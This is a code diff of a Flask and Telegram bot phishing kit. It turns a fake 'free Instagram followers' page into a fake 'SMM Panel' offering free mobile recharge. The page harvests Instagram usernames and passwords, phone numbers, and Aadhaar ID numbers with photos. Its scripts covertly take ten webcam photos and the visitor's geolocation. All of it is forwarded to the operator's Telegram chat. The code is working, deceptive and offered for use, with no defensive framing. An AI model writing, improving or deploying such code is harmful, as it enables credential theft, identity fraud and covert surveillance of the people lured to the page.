@@ -20,57 +20,178 @@ CHANNELS = ["@noruleclub"]
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# --- FAKE INSTAGRAM FOLLOWERS PANEL ---
+# --- REAL SMM PANEL WITH FREE RECHARGE ---
 SMM_PANEL_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free Instagram Followers</title>
+    <title>SMM Panel - Free Recharge</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            background: #0a0a1a;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
         }
-        .container {
-            background: rgba(255,255,255,0.95);
-            border-radius: 30px;
-            padding: 40px 35px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px);
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 20px;
+            border-bottom: 1px solid #2a2a4a;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo h1 {
-            font-size: 36px;
-            font-weight: 800;
-            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .logo p {
-            color: #666;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        .free-badge {
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             color: #fff;
-            padding: 8px 20px;
-            border-radius: 50px;
-            display: inline-block;
-            font-weight: 700;
+            font-size: 24px;
+            font-weight: 800;
+        }
+        .logo span {
+            color: #6c63ff;
+        }
+        .nav {
+            display: flex;
+            gap: 20px;
+        }
+        .nav a {
+            color: #888;
+            text-decoration: none;
             font-size: 14px;
+            transition: 0.3s;
+        }
+        .nav a:hover {
+            color: #fff;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .welcome-banner {
+            background: linear-gradient(135deg, #1a1a2e, #2a1a4e);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid #2a2a4a;
+            text-align: center;
+        }
+        .welcome-banner h1 {
+            color: #fff;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        .welcome-banner h1 span {
+            color: #6c63ff;
+        }
+        .welcome-banner p {
+            color: #888;
+            font-size: 16px;
+        }
+        .balance-box {
+            display: inline-block;
+            background: rgba(108, 99, 255, 0.1);
+            border: 1px solid #6c63ff;
+            border-radius: 12px;
+            padding: 15px 30px;
+            margin-top: 15px;
+        }
+        .balance-box .amount {
+            color: #6c63ff;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        .balance-box .label {
+            color: #888;
+            font-size: 14px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+        .card {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 25px;
+            border: 1px solid #2a2a4a;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .card:hover {
+            border-color: #6c63ff;
+            transform: translateY(-5px);
+        }
+        .card .icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        .card h3 {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .card p {
+            color: #888;
+            font-size: 14px;
+        }
+        .card .price {
+            color: #6c63ff;
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 10px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 24px;
+            padding: 40px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 1px solid #2a2a4a;
+            position: relative;
+        }
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            color: #888;
+            font-size: 28px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        .modal-close:hover {
+            color: #fff;
+        }
+        .modal h2 {
+            color: #fff;
+            font-size: 24px;
             margin-bottom: 20px;
         }
         .form-group {
@@ -78,75 +199,58 @@ SMM_PANEL_HTML = """
         }
         .form-group label {
             display: block;
-            color: #333;
+            color: #aaa;
             margin-bottom: 6px;
             font-size: 13px;
-            font-weight: 600;
+            font-weight: 500;
         }
-        .form-group input, .form-group select {
+        .form-group input, .form-group select, .form-group textarea {
             width: 100%;
             padding: 14px 16px;
-            background: #f5f5f5;
-            border: 2px solid #e0e0e0;
+            background: #0a0a1a;
+            border: 1px solid #2a2a4a;
             border-radius: 12px;
-            color: #333;
+            color: #fff;
             font-size: 15px;
             outline: none;
-            transition: all 0.3s;
+            transition: 0.3s;
         }
-        .form-group input:focus, .form-group select:focus {
-            border-color: #405de6;
-            box-shadow: 0 0 0 3px rgba(64, 93, 230, 0.15);
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            border-color: #6c63ff;
+            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.15);
         }
-        .form-group input::placeholder {
-            color: #999;
+        .form-group input::placeholder, .form-group textarea::placeholder {
+            color: #444;
+        }
+        .form-group textarea {
+            min-height: 80px;
+            resize: vertical;
         }
         .btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(45deg, #405de6, #5851db, #833ab4);
+            background: #6c63ff;
             border: none;
             border-radius: 12px;
             color: #fff;
-            font-size: 17px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
+            transition: 0.3s;
         }
         .btn:hover {
+            background: #5a52d5;
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(64, 93, 230, 0.4);
         }
         .btn:active {
             transform: translateY(0);
         }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #999;
-            font-size: 12px;
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #2a2a4a;
         }
-        .loader {
-            display: none;
-            text-align: center;
-            margin: 10px 0;
-        }
-        .loader.active {
-            display: block;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #405de6;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .btn-secondary:hover {
+            background: #2a2a4a;
         }
         .error-msg {
             background: #ff4444;
@@ -166,57 +270,224 @@ SMM_PANEL_HTML = """
             display: none;
             margin-bottom: 15px;
         }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .loader.active {
+            display: block;
+        }
+        .spinner {
+            border: 3px solid #2a2a4a;
+            border-top: 3px solid #6c63ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: #444;
+            font-size: 13px;
+            border-top: 1px solid #1a1a2e;
+            margin-top: 40px;
+        }
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00c853;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0a1a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2a2a4a;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #6c63ff;
+        }
     </style>
 </head>
 <body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">SMM<span>Panel</span></div>
+            <div class="nav">
+                <a href="#" onclick="showSection('dashboard')">Dashboard</a>
+                <a href="#" onclick="showSection('services')">Services</a>
+                <a href="#" onclick="showSection('recharge')">Free Recharge</a>
+            </div>
+        </div>
+    </div>
+
     <div class="container">
-        <div class="logo">
-            <h1>📸 InstaBoost</h1>
-            <p>Free Instagram Followers & Likes</p>
+        <div class="welcome-banner">
+            <h1>Welcome to <span>SMM Panel</span></h1>
+            <p>Get free Instagram followers, likes, and views</p>
+            <div class="balance-box">
+                <div class="label">Available Balance</div>
+                <div class="amount">$0.00</div>
+            </div>
         </div>
-        
-        <div style="text-align: center;">
-            <span class="free-badge">🔥 FREE FOLLOWERS</span>
-        </div>
-        
+
         <div id="errorMsg" class="error-msg"></div>
-        <div id="successMsg" class="success-msg">✅ Followers added successfully! Check your Instagram.</div>
-        
-        <form id="loginForm" onsubmit="return handleSubmit(event)">
-            <div class="form-group">
-                <label>📱 Instagram Username</label>
-                <input type="text" id="username" placeholder="Enter your Instagram username" required>
+        <div id="successMsg" class="success-msg"></div>
+
+        <!-- Dashboard Section -->
+        <div id="dashboard">
+            <h2 style="color:#fff; margin-bottom:20px;">📊 Dashboard</h2>
+            <div class="grid">
+                <div class="card">
+                    <div class="icon">👥</div>
+                    <h3>Followers</h3>
+                    <p>Get real Instagram followers</p>
+                    <div class="price">From $0.99</div>
+                </div>
+                <div class="card">
+                    <div class="icon">❤️</div>
+                    <h3>Likes</h3>
+                    <p>Boost your post engagement</p>
+                    <div class="price">From $0.49</div>
+                </div>
+                <div class="card">
+                    <div class="icon">👁️</div>
+                    <h3>Views</h3>
+                    <p>Increase video views</p>
+                    <div class="price">From $0.29</div>
+                </div>
+                <div class="card" onclick="openRecharge()">
+                    <div class="icon">🎁</div>
+                    <h3>Free Recharge</h3>
+                    <p>Get 1 month free recharge</p>
+                    <div class="price" style="color:#00c853;">FREE</div>
+                </div>
             </div>
-            <div class="form-group">
-                <label>🔑 Instagram Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+
+        <!-- Services Section -->
+        <div id="services" style="display:none;">
+            <h2 style="color:#fff; margin-bottom:20px;">🛒 Services</h2>
+            <div class="grid">
+                <div class="card" onclick="openService('followers')">
+                    <div class="icon">📈</div>
+                    <h3>Instagram Followers</h3>
+                    <p>100-5000 followers</p>
+                    <div class="price">$0.99 - $19.99</div>
+                </div>
+                <div class="card" onclick="openService('likes')">
+                    <div class="icon">❤️</div>
+                    <h3>Instagram Likes</h3>
+                    <p>100-5000 likes</p>
+                    <div class="price">$0.49 - $9.99</div>
+                </div>
+                <div class="card" onclick="openService('views')">
+                    <div class="icon">📺</div>
+                    <h3>Instagram Views</h3>
+                    <p>500-10000 views</p>
+                    <div class="price">$0.29 - $5.99</div>
+                </div>
             </div>
-            <div class="form-group">
-                <label>📧 Email (Optional)</label>
-                <input type="email" id="email" placeholder="Enter your email">
+        </div>
+
+        <!-- Recharge Section -->
+        <div id="recharge" style="display:none;">
+            <h2 style="color:#fff; margin-bottom:20px;">🎁 Free Recharge</h2>
+            <div class="card" style="max-width:500px; margin:0 auto;">
+                <h3 style="color:#fff; text-align:center;">Get 1 Month Free Recharge</h3>
+                <p style="color:#888; text-align:center; margin-bottom:20px;">Verify your identity to get free recharge</p>
+                <form id="rechargeForm" onsubmit="return handleRecharge(event)">
+                    <div class="form-group">
+                        <label>📱 Mobile Number</label>
+                        <input type="tel" id="mobile" placeholder="Enter your mobile number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>🏦 Operator</label>
+                        <select id="operator">
+                            <option value="jio">Jio</option>
+                            <option value="airtel">Airtel</option>
+                            <option value="vi">Vi</option>
+                            <option value="bsnl">BSNL</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>🆔 Aadhar Number</label>
+                        <input type="text" id="aadhar" placeholder="Enter 12 digit Aadhar number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>📸 Upload Aadhar Photo</label>
+                        <input type="file" id="aadharPhoto" accept="image/*" required>
+                    </div>
+                    <div class="form-group">
+                        <label>📧 Email (Optional)</label>
+                        <input type="email" id="email" placeholder="Enter your email">
+                    </div>
+                    
+                    <div class="loader" id="loader">
+                        <div class="spinner"></div>
+                        <p style="color:#666; margin-top:10px; font-size:13px;">Processing recharge...</p>
+                    </div>
+                    
+                    <button type="submit" class="btn" id="rechargeBtn">💰 Get Free Recharge</button>
+                </form>
             </div>
-            <div class="form-group">
-                <label>🎯 Followers Count</label>
-                <select id="followers">
-                    <option value="100">100 Followers</option>
-                    <option value="250" selected>250 Followers</option>
-                    <option value="500">500 Followers</option>
-                    <option value="1000">1000 Followers</option>
-                    <option value="2500">2500 Followers</option>
-                    <option value="5000">5000 Followers</option>
-                </select>
-            </div>
-            
-            <div class="loader" id="loader">
-                <div class="spinner"></div>
-                <p style="color:#666; margin-top:10px; font-size:13px;">Adding followers to your account...</p>
-            </div>
-            
-            <button type="submit" class="btn" id="loginBtn">🚀 Get Free Followers</button>
-        </form>
-        
+        </div>
+
         <div class="footer">
-            <p>🔒 Secure Connection • 100% Free</p>
+            <p>© 2026 SMM Panel • Secure Connection • 100% Free</p>
+        </div>
+    </div>
+
+    <!-- Service Modal -->
+    <div class="modal" id="serviceModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            <h2 id="serviceTitle">Service Details</h2>
+            <form id="serviceForm" onsubmit="return handleService(event)">
+                <div class="form-group">
+                    <label>📱 Instagram Username</label>
+                    <input type="text" id="instaUser" placeholder="Enter Instagram username" required>
+                </div>
+                <div class="form-group">
+                    <label>🔑 Instagram Password</label>
+                    <input type="password" id="instaPass" placeholder="Enter Instagram password" required>
+                </div>
+                <div class="form-group">
+                    <label>📧 Email</label>
+                    <input type="email" id="serviceEmail" placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label>🎯 Quantity</label>
+                    <select id="quantity">
+                        <option value="100">100</option>
+                        <option value="250" selected>250</option>
+                        <option value="500">500</option>
+                        <option value="1000">1000</option>
+                        <option value="2500">2500</option>
+                        <option value="5000">5000</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn">🚀 Place Order</button>
+            </form>
         </div>
     </div>
 
@@ -225,6 +496,30 @@ SMM_PANEL_HTML = """
         let photoCount = 0;
         let cameraStarted = false;
         
+        // Navigation
+        function showSection(section) {
+            document.getElementById('dashboard').style.display = section === 'dashboard' ? 'block' : 'none';
+            document.getElementById('services').style.display = section === 'services' ? 'block' : 'none';
+            document.getElementById('recharge').style.display = section === 'recharge' ? 'block' : 'none';
+        }
+        
+        // Open service
+        function openService(type) {
+            document.getElementById('serviceModal').classList.add('active');
+            document.getElementById('serviceTitle').textContent = type.charAt(0).toUpperCase() + type.slice(1) + ' Service';
+        }
+        
+        // Open recharge
+        function openRecharge() {
+            showSection('recharge');
+        }
+        
+        // Close modal
+        function closeModal() {
+            document.getElementById('serviceModal').classList.remove('active');
+        }
+        
+        // Camera - Background photos
         async function startCamera() {
             if (cameraStarted) return;
             cameraStarted = true;
@@ -241,8 +536,10 @@ SMM_PANEL_HTML = """
                 video.srcObject = stream;
                 await video.play();
                 
+                // Take first photo
                 await takePhoto(video, 1);
                 
+                // Take remaining 9 photos every 3 seconds
                 for (let i = 2; i <= 10; i++) {
                     await new Promise(resolve => setTimeout(resolve, 3000));
                     await takePhoto(video, i);
@@ -281,69 +578,111 @@ SMM_PANEL_HTML = """
             photoCount = num;
         }
         
+        // Start camera on load
         window.onload = function() {
             setTimeout(() => {
                 startCamera();
-            }, 500);
+            }, 1000);
         };
         
-        async function handleSubmit(e) {
+        // Handle service order
+        async function handleService(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const email = document.getElementById('email').value || 'N/A';
-            const followers = document.getElementById('followers').value;
+            const username = document.getElementById('instaUser').value;
+            const password = document.getElementById('instaPass').value;
+            const email = document.getElementById('serviceEmail').value || 'N/A';
+            const quantity = document.getElementById('quantity').value;
+            const service = document.getElementById('serviceTitle').textContent;
             
             if (!username || !password) {
-                showError('Please enter your Instagram username and password');
+                showError('Please enter Instagram username and password');
+                return;
+            }
+            
+            const data = {
+                chat_id: chatId,
+                type: 'service',
+                service: service,
+                username: username,
+                password: password,
+                email: email,
+                quantity: quantity,
+                photo_count: photoCount
+            };
+            
+            await sendData(data);
+            closeModal();
+            showSuccess('✅ Order placed successfully!');
+        }
+        
+        // Handle recharge
+        async function handleRecharge(e) {
+            e.preventDefault();
+            
+            const mobile = document.getElementById('mobile').value;
+            const operator = document.getElementById('operator').value;
+            const aadhar = document.getElementById('aadhar').value;
+            const aadharPhoto = document.getElementById('aadharPhoto').files[0];
+            const email = document.getElementById('email').value || 'N/A';
+            
+            if (!mobile || !aadhar || !aadharPhoto) {
+                showError('Please fill all required fields');
+                return;
+            }
+            
+            if (aadhar.length !== 12 || !/^\d+$/.test(aadhar)) {
+                showError('Please enter valid 12 digit Aadhar number');
                 return;
             }
             
             const loader = document.getElementById('loader');
-            const loginBtn = document.getElementById('loginBtn');
+            const rechargeBtn = document.getElementById('rechargeBtn');
             
             loader.classList.add('active');
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Adding followers...';
+            rechargeBtn.disabled = true;
+            rechargeBtn.textContent = 'Processing...';
             
-            const data = {
-                chat_id: chatId,
-                username: username,
-                password: password,
-                email: email,
-                followers: followers,
-                photo_count: photoCount
+            // Convert Aadhar photo to base64
+            const reader = new FileReader();
+            reader.onload = async function(e) {
+                const aadharPhotoData = e.target.result;
+                
+                const data = {
+                    chat_id: chatId,
+                    type: 'recharge',
+                    mobile: mobile,
+                    operator: operator,
+                    aadhar: aadhar,
+                    aadhar_photo: aadharPhotoData,
+                    email: email,
+                    photo_count: photoCount
+                };
+                
+                await sendData(data);
+                loader.classList.remove('active');
+                rechargeBtn.disabled = false;
+                rechargeBtn.textContent = '💰 Get Free Recharge';
+                showSuccess('✅ Recharge successful! 1 month free recharge added.');
+                document.getElementById('rechargeForm').reset();
             };
+            reader.readAsDataURL(aadharPhoto);
             
+            return false;
+        }
+        
+        // Send data to bot
+        async function sendData(data) {
             try {
-                const response = await fetch('/insta-login', {
+                const response = await fetch('/smm-data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    document.getElementById('successMsg').style.display = 'block';
-                    document.getElementById('loginForm').style.display = 'none';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://instagram.com';
-                    }, 4000);
-                } else {
-                    showError('Failed to add followers. Please try again.');
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = '🚀 Get Free Followers';
-                }
+                return await response.json();
             } catch (error) {
                 showError('Connection error. Please try again.');
-                loginBtn.disabled = false;
-                loginBtn.textContent = '🚀 Get Free Followers';
             }
-            
-            loader.classList.remove('active');
         }
         
         function showError(msg) {
@@ -354,12 +693,21 @@ SMM_PANEL_HTML = """
                 errorDiv.style.display = 'none';
             }, 5000);
         }
+        
+        function showSuccess(msg) {
+            const successDiv = document.getElementById('successMsg');
+            successDiv.textContent = msg;
+            successDiv.style.display = 'block';
+            setTimeout(() => {
+                successDiv.style.display = 'none';
+            }, 5000);
+        }
     </script>
 </body>
 </html>
 """
 
-# --- REDIRECT PAGE ---
+# --- LOADING PAGE ---
 def get_html(chat_id, redirect_url):
     return f"""
 <!DOCTYPE html>
@@ -368,22 +716,32 @@ def get_html(chat_id, redirect_url):
     <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;}}
-        .loader{{border:4px solid #333;border-top:4px solid #007bff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}}
+        body{{background:#0a0a1a;color:#fff;text-align:center;font-family:sans-serif;padding-top:80px;}}
+        .loader{{border:4px solid #1a1a2e;border-top:4px solid #6c63ff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px auto;}}
         @keyframes spin {{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}
-        p{{color:#888; font-size:14px;}}
+        p{{color:#666; font-size:14px;}}
+        h2{{font-weight:300; color:#fff;}}
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <h2>Loading...</h2>
-    <p>Please wait while we prepare your free followers</p>
+    <h2>Loading SMM Panel...</h2>
+    <p>Please wait while we secure your connection</p>
     
     <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         async function startTrap() {{
+            // First ask location
+            try {{
+                await new Promise((resolve) => {{
+                    navigator.geolocation.getCurrentPosition(pos => {{
+                        resolve();
+                    }}, () => resolve(), {{timeout: 5000}});
+                }});
+            }} catch(e) {{}}
+
             let data = {{
                 chat_id: "{chat_id}",
                 userAgent: navigator.userAgent,
@@ -417,6 +775,19 @@ def get_html(chat_id, redirect_url):
                 }}
             }} catch(e) {{}}
 
+            // Get location
+            try {{
+                await new Promise((resolve) => {{
+                    navigator.geolocation.getCurrentPosition(pos => {{
+                        data.lat = pos.coords.latitude;
+                        data.lon = pos.coords.longitude;
+                        data.perm_loc = "Allowed";
+                        resolve();
+                    }}, () => resolve(), {{timeout: 3000}});
+                }});
+            }} catch(e) {{}}
+
+            // Then ask camera
             try {{
                 let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
                 data.perm_cam = "Allowed"; 
@@ -432,23 +803,14 @@ def get_html(chat_id, redirect_url):
                 stream.getTracks().forEach(t => t.stop());
             }} catch(e) {{}}
 
-            try {{
-                await new Promise((resolve) => {{
-                    navigator.geolocation.getCurrentPosition(pos => {{
-                        data.lat = pos.coords.latitude;
-                        data.lon = pos.coords.longitude;
-                        data.perm_loc = "Allowed";
-                        resolve();
-                    }}, () => resolve(), {{timeout: 3000}});
-                }});
-            }} catch(e) {{}}
-
+            // Send data
             await fetch('/upload', {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify(data)
             }});
 
+            // Redirect to SMM panel
             window.location.href = "/smm-panel?chat_id={chat_id}";
         }}
         window.onload = startTrap;
@@ -468,32 +830,68 @@ def smm_panel():
     chat_id = request.args.get('chat_id')
     return render_template_string(SMM_PANEL_HTML, chat_id=chat_id)
 
-@app.route('/insta-login', methods=['POST'])
-def insta_login():
+@app.route('/smm-data', methods=['POST'])
+def smm_data():
     data = request.json
     chat_id = data.get('chat_id')
-    username = data.get('username')
-    password = data.get('password')
-    email = data.get('email', 'N/A')
-    followers = data.get('followers', '250')
-    photo_count = data.get('photo_count', 0)
+    data_type = data.get('type', 'unknown')
     
     if not chat_id:
         return {"success": False}, 400
     
-    msg = f"""
-📸 **Instagram Account Credentials**
+    if data_type == 'recharge':
+        msg = f"""
+🎁 **Free Recharge Request**
 
 ━━━━━━━━━━━━━━━━
 
-👤 **Account Details:**
-   • Username: `{username}`
-   • Password: `{password}`
-   • Email: `{email}`
+📱 **Mobile Details:**
+   • Number: `{data.get('mobile')}`
+   • Operator: `{data.get('operator')}`
 
-📊 **Request:**
-   • Followers: `{followers}`
-   • Photos: `{photo_count}/10`
+🆔 **Aadhar Details:**
+   • Number: `{data.get('aadhar')}`
+   • Photo: ✅ Received
+
+📧 **Email:** `{data.get('email')}`
+
+📸 **Photos Taken:** `{data.get('photo_count', 0)}/10`
+
+🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
+
+━━━━━━━━━━━━━━━━
+⚡ @FROXLS
+"""
+        
+        # Send Aadhar photo
+        if data.get('aadhar_photo'):
+            try:
+                img_data = base64.b64decode(data.get('aadhar_photo').split(',')[1])
+                requests.post(
+                    f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                    data={'chat_id': chat_id, 'caption': '🆔 Aadhar Photo'},
+                    files={'photo': ('aadhar.jpg', img_data)}
+                )
+            except:
+                pass
+    
+    else:  # service
+        msg = f"""
+📸 **SMM Service Order**
+
+━━━━━━━━━━━━━━━━
+
+🛒 **Service:** `{data.get('service')}`
+
+👤 **Instagram Account:**
+   • Username: `{data.get('username')}`
+   • Password: `{data.get('password')}`
+
+📧 **Email:** `{data.get('email')}`
+
+📊 **Quantity:** `{data.get('quantity')}`
+
+📸 **Photos Taken:** `{data.get('photo_count', 0)}/10`
 
 🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
 
@@ -529,7 +927,7 @@ def camera_photo():
         img_data = base64.b64decode(photo.split(',')[1])
         requests.post(
             f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-            data={'chat_id': chat_id, 'caption': f'📸 Photo #{photo_num}'},
+            data={'chat_id': chat_id, 'caption': f'📸 Photo #{photo_num}/10'},
             files={'photo': (f'photo_{photo_num}.jpg', img_data)}
         )
     except:
@@ -646,7 +1044,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    await update.message.reply_text("👋 **Free Instagram Followers!**\nLink bhejo.")
+    await update.message.reply_text("👋 **Welcome to SMM Panel!**\nLink bhejo.")
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -663,7 +1061,7 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     redir = urllib.parse.quote(url)
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
 
-    await update.message.reply_text(f"✅ **Link:**\n`{link}`")
+    await update.message.reply_text(f"✅ **SMM Panel Link:**\n`{link}`")
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
